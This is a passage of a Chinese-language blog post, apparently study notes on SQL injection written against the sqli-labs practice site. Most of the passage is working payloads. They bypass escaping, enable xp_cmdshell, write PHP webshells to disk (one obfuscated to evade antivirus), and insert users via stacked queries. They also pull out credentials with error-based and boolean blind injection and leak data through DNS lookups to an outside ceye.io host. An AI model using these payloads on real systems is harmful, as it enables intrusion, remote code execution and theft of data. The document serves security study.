alt="image-20220726165029504" style="zoom:67%;"></li><li><p>影响</p><p>如果开启魔术引号，则上传语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,load_file(&#x27;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\sql-lab.sql&#x27;),3</span><br></pre></td></tr></table></figure><p>会被转义成如下内容，使SQL注入命令失效：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,load_file(\&#x27;D:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\sqli-labs-master\\\\sql-lab.sql\&#x27;),3</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726165127494.png" alt="image-20220726165127494"></p></li><li><p>绕过</p><p><strong>可以把引号所包含的路径内容（不要单引号）编码为hex进行绕过</strong>。</p><p>绕过原理：sql可以识别并执行用hex表示的语句</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726165729917.png" alt="image-20220726165729917"></p></li></ul><h3 id="利用SQL注入执行命令"><a href="#利用SQL注入执行命令" class="headerlink" title="利用SQL注入执行命令"></a>利用SQL注入执行命令</h3><p><a href="https://www.cnblogs.com/feiquan/p/8673093.html">https://www.cnblogs.com/feiquan/p/8673093.html</a></p><p>借助 xp_cmdshell 运行cmd命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">USE master</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE --先执行一次刷新，处理上次的配置</span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1 --启用xp_cmdshell的高级配置</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE --刷新配置</span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1  --打开xp_cmdshell,可以调用SQL系统之外的命令</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line">--使用xp_cmdshell在D盘创建一个myfile 文件夹</span><br><span class="line">EXEC xp_cmdshell &#x27;mkdir d:\myfile&#x27;,no_output --[no_output]表示是否输出信息</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p>SQLserver执行系统命令的几种方式：<a href="https://www.cnblogs.com/Azjj/p/14019312.html">https://www.cnblogs.com/Azjj/p/14019312.html</a></p><ul><li><p><strong>xp_cmdshell</strong></p></li><li><p><strong>SP_OACREATE</strong></p></li><li><p><strong>通过沙盒执行命令</strong></p></li></ul><h3 id="x3D-x3D-SQL注入写webshel-x3D-x3D"><a href="#x3D-x3D-SQL注入写webshel-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;SQL注入写webshel&#x3D;&#x3D;"></a>&#x3D;&#x3D;SQL注入写webshel&#x3D;&#x3D;</h3><p><a href="https://blog.csdn.net/huangyongkang666/article/details/123728115">https://blog.csdn.net/huangyongkang666/article/details/123728115</a></p><h4 id="上传webshell文件"><a href="#上传webshell文件" class="headerlink" title="上传webshell文件"></a>上传webshell文件</h4><p>上传文件的条件：</p><ol><li>网站物理路径；</li><li>文件写入的权限；</li><li>secure_file_priv 不为 NULL；</li></ol><p>secure_file_priv&#x3D;NULL时，无法导入导出文件；而当设置不为空时，导入导出文件不受限制；如果设置为某个文件路径，如secure_file_priv&#x3D;&#x2F;mysql&#x2F;时，则导入导出必须要在该文件目录下完成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;’ into outfile &#x27;D:/WWW/evil.php&#x27;</span><br><span class="line"></span><br><span class="line">?id=1 union select 1,&quot;&lt;?php @eval($_POST[&#x27;g&#x27;]);?&gt;&quot;,3 into outfile &#x27;D:/WWW/evil.php&#x27;</span><br><span class="line"></span><br><span class="line">?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile &quot;D:/WWW/evil.php&quot;</span><br></pre></td></tr></table></figure><h4 id="利用分隔符写入"><a href="#利用分隔符写入" class="headerlink" title="利用分隔符写入"></a>利用分隔符写入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1 into outfile &#x27;D:/WWW/evil.php&#x27; fields terminated by &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span><br><span class="line"></span><br><span class="line">?id=1 into outfile &#x27;D:/WWW/evil.php&#x27; lines terminated by &#x27;&lt;?php phpinfo() ?&gt;&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=1 LIMIT 0,1 INTO OUTFILE &#x27;D:/WWW/evil.php&#x27; lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines terminated by  （一句话hex编码）#</span><br><span class="line"></span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; fields terminated by （一句话hex编码）#</span><br><span class="line"></span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; columns terminated by （一句话hex编码）#</span><br><span class="line"></span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines starting by    （一句话hex编码）#</span><br></pre></td></tr></table></figure><h4 id="利用日志写入"><a href="#利用日志写入" class="headerlink" title="利用日志写入"></a>利用日志写入</h4><p>新版本的MySQL设置了导出文件的路径，很难在获取Webshell过程中去修改配置文件，无法通过使用select into outfile来写入一句话。这时，我们可以通过修改MySQL的log文件来获取Webshell。</p><p>利用条件：</p><ul><li>对web目录有写权限</li><li>GPC关闭(GPC:是否对单引号转义)</li><li>有绝对路径(读文件可以不用，写文件需要)</li><li>需要能执行多行SQL语句</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;             # 查看配置</span><br><span class="line"></span><br><span class="line">set global general_log = on;               # 开启general log模式,将所有到达MySQL Server的SQL语句记录下来。</span><br><span class="line"></span><br><span class="line">set global general_log_file = &#x27;D:/WWW/evil.php&#x27;; # 设置日志目录为shell地址</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php eval($_GET[g]);?&gt;&#x27;              # 写入shell</span><br><span class="line"></span><br><span class="line">set global general_log=off;                   # 关闭general log模式</span><br></pre></td></tr></table></figure><p>在高版本的mysql中默认为NULL，就是不让导入和导出</p><p>解决办法：</p><p>在Windows下可在my.ini的[mysqld]里面，添加secure_file_priv</p><p>在linux下可在&#x2F;etc&#x2F;my.cnf的[mysqld]里面，添加secure_file_priv</p><p>使用慢查询日志绕过此限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;#查看慢查询日志开启情况</span><br><span class="line"></span><br><span class="line">set global slow_query_log=1#开启慢查询日志</span><br><span class="line"></span><br><span class="line">set global slow_query_log_file=&#x27;D:/phpStudy/WWW/evil.php;    #修改日志文件存储的绝对路径</span><br><span class="line"></span><br><span class="line">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11);#写入shell</span><br><span class="line"></span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;; #使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间</span><br></pre></td></tr></table></figure><p>免杀shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php $p = array(&#x27;f&#x27;=&gt;&#x27;a&#x27;,&#x27;pffff&#x27;=&gt;&#x27;s&#x27;,&#x27;e&#x27;=&gt;&#x27;fffff&#x27;,&#x27;lfaaaa&#x27;=&gt;&#x27;r&#x27;,&#x27;nnnnn&#x27;=&gt;&#x27;t&#x27;);$a = array_keys($p);$_=$p[&#x27;pffff&#x27;].$p[&#x27;pffff&#x27;].$a[2];$_= &#x27;a&#x27;.$_.&#x27;rt&#x27;;$_(base64_decode($_REQUEST[&#x27;cmd&#x27;]));?&gt;&quot;</span><br></pre></td></tr></table></figure><h2 id="6-SQL注入进阶"><a href="#6-SQL注入进阶" class="headerlink" title="6. SQL注入进阶"></a>6. SQL注入进阶</h2><h3 id="x3D-x3D-堆叠注入-x3D-x3D"><a href="#x3D-x3D-堆叠注入-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;"></a>&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;</h3><p><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p><p>stacked injections（堆叠注入）就是多条sql语句一起执行。在mysql 中，一条语句结尾加<code>;</code>表示语句结束，多语句之间以分号隔开。堆叠注入就是利用这个特点，在第二个SQL语句中构造自己要执行的语句。</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users; select * from emails;</span><br></pre></td></tr></table></figure><p>将堆叠注入运用于创建用户，以此迂回得到自定义的账户密码。但是前提是网站的管理员必须是高权限才能完全创建用户。也可以使用update更新管理员用户密码。</p><p><code>id=1&#39;;insert into users(id,username,password) values ( 39, &#39;less38 &#39;, &#39;hello &#39;)--+</code></p><p>当网站使用PDO技术（一种防护手段）执行SQL语句时，可以执行多语句，不过这样通常不能直接得到注入结果，因为PDO只会返回第一条SQL语句执行的结果， 所以在第二条语句中可以用update更新数据或者使用时间盲注获取数据。</p><p><code>id=1&#39;;select if(substr(user(),1,1)=&#39;r&#39;, sleep(3), 1)--+</code></p><h3 id="加解密编码注入"><a href="#加解密编码注入" class="headerlink" title="加解密编码注入"></a>加解密编码注入</h3><p>某些注入点会对参数值进行编码。比如下面的cookie进行了base64编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /Less-21/index.php HTTP/1.1</span><br><span class="line">Host: 10.1.1.133</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://10.1.1.133/Less-21/index.php</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: uname=YWRtaW4%3D</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p><code>YWRtaW4%3D</code>是一个base64加密的字符串，其中%3D是编码中的<code>=</code>符号，把他发送到编码模块当中解密，得到明文admin。</p><p>所以构造好注入语句后，也需要进行编码，也就是说<code>admin&#39; and 1=1</code>加密之后的值是<code>YWRtaW4nIGFuZCAxPTE=</code>。</p><p>而获取数据库名称的报错盲注的语句<code>admin&#39; or updatexml(1,concat(0x7e,(database())),0) or &#39;</code>加密后cookie值<code>Cookie: uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChkYXRhYmFzZSgpKSksMCkgb3IgJwo=</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728092746776.png"></p><h3 id="二次注入（绕过转义）"><a href="#二次注入（绕过转义）" class="headerlink" title="二次注入（绕过转义）"></a>二次注入（绕过转义）</h3><p>（sqlilabs less 24）</p><p>二次注入原理，主要分为两步</p><ul><li><p>第一步：插入恶意数据</p><p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据。但是，数据本身包含恶意内容。</p></li><li><p>第二步：引用恶意数据</p><p>在将数据存入到了数据库中之后。开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一 步的检验和处理，这样就会造成SQL的二次注入。</p><p>在前端和URL（黑盒测试）是无法发现二次注入，无法用工具扫描，<u>只有在代码审计时才能发现是否存在二次注入，也就是提前知道所插入的恶意数据的类型，在哪里被SQL利用</u>。</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/d03f2d86af5e7aee0e09c2379236aa52378eac48.png@812w_395h_progressive.webp" alt="img"></p><p><strong>举例：</strong></p><p>比如<u>已经通过代码审计知道</u>，网页有注册和查询&#x2F;更改密码的功能，并且：</p><p>注册页面会在后台执行insert语句<code>insert into user(id,username,pwd) values(2,’x’,’123’)</code></p><p>更改密码，则包含update语句<code>upadte user set pwd=’123456’ where id=2 and username=’admin’</code>。</p><p>在注册页面网站使用了addslashes进行了特殊字符的转义，所以无法直接进行注入。但是也因此可以插入一些恶意数据，比如使用<code>admin&#39; and 1=1#</code>作为用户名进行注册。</p><p>那么在更新密码页面，就会执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upadte user set pwd=’123’ where id=2 and username=&#x27;admin&#x27; and 1=1#&#x27;</span><br></pre></td></tr></table></figure><p>同理，如果换成注册其它用户名，更新的时候也会形成不同的注入语句。</p><p>比如使用<code>dhakkan&#39;#</code>作为用户名注册，那么更新密码时就会执行：</p><p><code>upadte user set pwd=’sss’ where username=&#39;dhakkan&#39;#&#39;</code></p><p>被更新密码的账户从<code>dhakkan&#39;#</code>变成了<code>dhakkan</code>。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/4bdb21dc2e0d6958a868d38e4560a7de15dfa1c8.png@461w_92h_progressive.webp" alt="img"></p><p>以此类推，可以借助用户名来爆数据库信息：</p><p>若输入用户名：<code>&#39; or updatexml(1,concat(0x7e,version()),0) or’</code> 和密码：123</p><p>那么更新密码的SQL就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`update users set pwd=&#x27;sss&#x27; where username=&#x27;&#x27; or updatexml(1,concat(0x7e,version()),0) or&#x27;&#x27; and password=&#x27;123456&#x27;</span><br></pre></td></tr></table></figure><p>但是网站有时会限制用户名长度，如果是在前端限制，可以修改Maxlength，如果是后端代码进行的限制，则无法成功注入。</p><h3 id="load-file-amp-DNSlog注入（解决无回显）"><a href="#load-file-amp-DNSlog注入（解决无回显）" class="headerlink" title="load_file&amp;DNSlog注入（解决无回显）"></a>load_file&amp;DNSlog注入（解决无回显）</h3><p>sqlilabs-less9-load_file&amp;dnslog 带外注入（实际案例）</p><p><strong>dnslog解决了盲注不能回显数据，效率低的问题</strong></p><p><strong>原理</strong>：<code>load_file</code>支持对外的<strong>文件读取</strong>，通过在URL中加入SQL语句，可以<u>借助读取DNS访问记录得到SQL语句的执行结果</u>。</p><p>比如构造如下语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and if((select load_file(concat(&#x27;////&#x27;,(select version()),&#x27;.yk2kql.ceye.io//abc&#x27;))),0,1)--+</span><br></pre></td></tr></table></figure><p><strong>工具</strong>：<a href="http://ceye.io，注册后可以获得个人的DNS地址：">http://ceye.io，注册后可以获得个人的DNS地址：</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/9ded59fe90f60d1cdb4049308f40ac2abe13467b.png@725w_165h_progressive.webp" alt="img"></p><p>成功注入之后，可以在ceye.io网站看到所访问的链接，其中包含了version()数据库版本信息5.5.53.1。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728101718259.png" alt="image-20220728101718259"></p><p>或者查看数据库名称：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and if((select load_file(concat(&#x27;////&#x27;,(select database()),&#x27;.yk2kql.ceye.io//abc&#x27;))),0,1)--+</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814095417887.png" alt="image-20220814095417887"></p><p>参考资料：<a href="https://www.cnblogs.com/xhds/p/12322839.html">https://www.cnblogs.com/xhds/p/12322839.html</a></p><p>使用DnsLog盲注仅限于windos环境。</p><ul><li><p><strong>使用工具DnslogSqlinj</strong></p><p><a href="https://github.com/ADOOO/DnslogSqlinj">https://github.com/ADOOO/DnslogSqlinj</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728102540802.png" alt="image-20220728102540802"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728102804316.png" alt="image-20220728102804316"></p><p>获取数据库名称：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728103014120.png" alt="image-20220728103014120"></p></li></ul><h3 id="宽字节注入（绕过转义）"><a href="#宽字节注入（绕过转义）" class="headerlink" title="宽字节注入（绕过转义）"></a>宽字节注入（绕过转义）</h3><p>当网站对参数进行了转义时，单引号等会被转义符（反斜杠）转义，导致攻击语句失效。所以在一般情况下，此处是不存在SQL注入漏洞的。</p><p>不过有一个特例，就是当数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式是在单引号前会先加个%df。这样就变成了<code>id=1%df&#39;</code>，经过转义就是<code>id=1%df%5c&#39;</code>。因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字”連”，所以这时，单引号成功被读入。</p><p>所以可以构造攻击语句：<code>id=1%df&#39; and 1=1%23</code>进行注入点的判断。</p><h3 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h3><p>XFF是HTTP请求头中的一个头部参数X-Forwarded- for。X- Forwarded- For简称XFF头，它代表客户端真实的IP。</p><p>通过修改X-Forwarded-for的值可以伪造客户端IP，将X Forwarded -for设置为127.0.0.1，然后访问该URL，页面返回正常。</p><p>如果网站有通过诸如$_SERVER之类的函数获取XFF，并用于SQL语句，那么就可以尝试进行注入。</p><p>比如构造攻击语句：<code>X Forwarded -for=127.0.0.1&#39; union select 1,2,3,4#</code></p><h2 id="7-SQL注入类型"><a href="#7-SQL注入类型" class="headerlink" title="7. SQL注入类型"></a>7. SQL注入类型</h2><h3 id="按照注入方式"><a href="#按照注入方式" class="headerlink" title="按照注入方式"></a>按照注入方式</h3><h4 id="普通注入和盲注"><a href="#普通注入和盲注" class="headerlink" title="普通注入和盲注"></a>普通注入和盲注</h4><p>普通注入就是注入的<u>页面是直接显示数据库中的字段内容的</u>，我们可以通过 SQL 注入一步一步把数据库中我们想要的内容显示在页面中。</p><p>盲注则要困难很多，<u>页面不直接显示数据库字段内容</u>，显示的可能只是一个判断结果（是或者否），页面只能告诉你你构造的 SQL 语句对还是错，你要查询的内容存在还是不存在。</p><p>其中不回显的原因可能是 SQL 语句的问题导致，因为像insert、delete等查询语句即使执行成功，也不会回显。此外，网站的前端页面显示也会限制。</p><ul><li><p>select 查询数据</p><p>例：<code>select * from news where id=$id</code></p><p>应用：查询用户</p></li><li><p>insert 插入数据</p><p>例：<code>insert into users(id,username,password) values(30,&#39;x&#39;,&#39;123&#39;)</code></p><p>应用：网站的用户注册</p><p>和select操作的数据包相似，但是不能像普通select注入一样操作。</p></li><li><p>delete 删除数据</p><p>例：<code>delete from users where id=30</code></p><p>应用：后台管理里面删除用户等操作、删除留言等</p></li><li><p>update 更新数据</p><p>例：<code>update users set password=&#39;123&#39; where id=11 and username=&#39;admin3&#39;</code></p><p>应用：会员或后台中心数据同步或缓存等操作、登录后修改个人信息，如密码等</p></li><li><p>order by 排序数据</p><p>一般结合表名或列名进行数据排序操作</p><p>例：select * from news order by $id</p><p>例：select id,name,price from news order by $order</p></li></ul><h4 id="基于报错的SQL盲注（优先）"><a href="#基于报错的SQL盲注（优先）" class="headerlink" title="基于报错的SQL盲注（优先）"></a>基于报错的SQL盲注（优先）</h4><p>12种报错注入+万能语句：<a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p><p>floor、extractvalue、updatexml报错原理：<a href="https://developer.aliyun.com/article/692723">https://developer.aliyun.com/article/692723</a></p><ul><li><p><strong>floor向下取整数</strong></p><p>0x7e为<code>~</code></p><p>rand() 产生[0,1)的随机小数；</p><p>group by 按照指定字段对查询结果进行分组，常结合count()、sum()、avg()、max()、min()等使用。</p><p>利用了MySQL的第8652号bug ：Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果：在 <strong>rand()和group by同时使用</strong> 的时候，可能会产生超出预期的结果，因为会<u>多次对同一列进行查询</u>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//select</span><br><span class="line">// 爆数据库版本</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 通过修改limit后面数字一个一个爆表</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 爆出所有表</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 爆出所有字段名</span><br><span class="line">1&#x27; and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 爆出所有字段名</span><br><span class="line">1&#x27; and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">//爆出该账户的密码。</span><br><span class="line">1&#x27; and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username=&#x27;admin1&#x27;),0x7e,floor(rand(0)*2)))a)# </span><br><span class="line"></span><br><span class="line">//insert</span><br><span class="line">username=x&#x27; or (select 1 from (select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;</span><br><span class="line"></span><br><span class="line">//update</span><br><span class="line">add=hubeNicky&#x27; or (select 1 from (select count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or &#x27;</span><br><span class="line"></span><br><span class="line">// delete</span><br><span class="line">id=56+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)</span><br><span class="line">// 由于是在数据包中编辑，所以用+代替空格，避免歧义</span><br></pre></td></tr></table></figure><p>报错结果如下，显示出了数据库名称：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727195036461.png" alt="image-20220727195036461"></p></li><li><p><code>extractvalue(xml_frag, xpath_expr)</code></p><p>xml_frag为XML标记片段，xpath_expr表示从XML字符串中匹配元素。如果xpath_expr格式语法书写错误的话，就会报错，输出xpath_expr。利用这个特性可以构造注入点。</p><p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p><p>![1551928141656](<a href="https://blogs-pic.oss-cn-beijing.aliyuncs.com/images/2019-03-07">https://blogs-pic.oss-cn-beijing.aliyuncs.com/images/2019-03-07</a> 报错注入：extractvalue、updatexml&#x2F;1551928141656.png?x-oss-process&#x3D;style&#x2F;shuiyin)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// insert</span><br><span class="line">username=x&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;</span><br><span class="line"></span><br><span class="line">// update</span><br><span class="line">add=hubeNicky&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;</span><br><span class="line"></span><br><span class="line">// delete</span><br><span class="line">?id=56+or+extractvalue(1,concat(0x7e,database()))</span><br></pre></td></tr></table></figure><p>其中的concat()函数是将其参数连成一个字符串，因此不会符合xpath_expr的格式，从而出现格式错误，爆出</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727193832420.png" alt="image-20220727193832420"></p></li><li><p><code>UpdateXML(xml_document, xpath_expr, new_xml)</code></p><p>xml_document：String格式，为XML文档对象的名称</p><p>xpath_expr：Xpath格式的字符串</p><p>new_xml：String格式，替换查找到的符合条件的数据</p><p>作用：改变文档中符合条件的节点的值，即改变XML_document中符合XPATH_string的值</p><p>此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为新的XML片段 new_xml，然后返回更改的XML。xml_document替换的部分 与xpath_expr用户提供的XPath表达式匹配。</p><p>如果未xpath_expr找到表达式匹配，或者找到多个匹配项，则该函数返回原始xml_document的XML片段。所有三个参数都应该是字符串。</p><p>和上面的extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1551929714141.png" alt="1551929714141"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// insert</span><br><span class="line">username=x&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;</span><br><span class="line"></span><br><span class="line">// update</span><br><span class="line">add=hubeNicky&#x27; or  updatexml(1,concat(0x7e,(version())),0) or &#x27;</span><br><span class="line"></span><br><span class="line">// delete</span><br><span class="line">?id=56+or+updatexml+(1,concat(0x7e,database()),0)</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727195708498.png" alt="image-20220727195708498"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727195718450.png" alt="image-20220727195718450"></p></li></ul><h4 id="基于布尔的SQL盲注（其次）"><a href="#基于布尔的SQL盲注（其次）" class="headerlink" title="基于布尔的SQL盲注（其次）"></a>基于布尔的SQL盲注（其次）</h4><p>逻辑判断，regexp正则表达式，like，ascii，left，ord返回字符串第一个字符的ascii码，mid取字符串子串。</p><p>布尔型盲注是指注入页面中没有直接显示数据内容，但会显示输出的结果对还是错，查询的数据有还是没有。</p><ul><li><p><strong>猜解数据库长度</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or length(database()) &gt; 8 --+    # 符合条件返回正确，反之返回错误</span><br></pre></td></tr></table></figure></li><li><p><strong>猜解数据库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid(database(),1,1)=&#x27;z&#x27; 